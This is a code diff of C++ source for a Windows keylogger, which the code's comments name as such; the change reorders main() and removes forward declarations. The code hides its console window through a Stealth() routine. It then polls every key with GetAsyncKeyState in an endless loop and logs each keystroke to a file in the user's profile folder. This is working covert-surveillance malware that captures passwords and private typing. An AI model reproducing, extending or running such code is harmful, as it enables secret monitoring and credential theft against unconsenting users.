@@ -10,43 +10,6 @@
 /// <param name="key_stroke">key</param>
 /// <param name="file">output file</param>
 /// <returns></returns>
-int SaveLogs(int key_stroke, const char* file);
-/// <summary>
-/// Function to hidden the keylogger
-/// </summary>
-void Stealth();
-
-/// <summary>
-/// Main
-/// </summary>
-/// <returns></returns>
-int main() 
-{
-	Stealth();
-	char i;
-	std::string pathFile = std::getenv("USERPROFILE");
-	pathFile += "\\log.txt";
-
-	const char* file = pathFile.c_str();
-
-	while (1)
-	{
-		for (i = 8; i <= 190; i++)
-		{
-			if (GetAsyncKeyState(i) == -32767)
-			{
-				SaveLogs(i, file);
-			}
-		}
-	}
-}
-
-/// <summary>
-/// Function to save the logs
-/// </summary>
-/// <param name="key_stroke">key</param>
-/// <param name="file">output file</param>
-/// <returns></returns>
 int SaveLogs(int key_stroke, const char* file)
 {
 	if ((key_stroke == 1) || (key_stroke == 2))
@@ -119,4 +82,29 @@ void Stealth()
 	AllocConsole();
 	Stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(Stealth, 0);
+}
+
+/// <summary>
+/// Main
+/// </summary>
+/// <returns></returns>
+int main()
+{
+	Stealth();
+	char i;
+	std::string pathFile = std::getenv("USERPROFILE");
+	pathFile += "\\log.txt";
+
+	const char* file = pathFile.c_str();
+
+	while (1)
+	{
+		for (i = 8; i <= 190; i++)
+		{
+			if (GetAsyncKeyState(i) == -32767)
+			{
+				SaveLogs(i, file);
+			}
+		}
+	}
 }
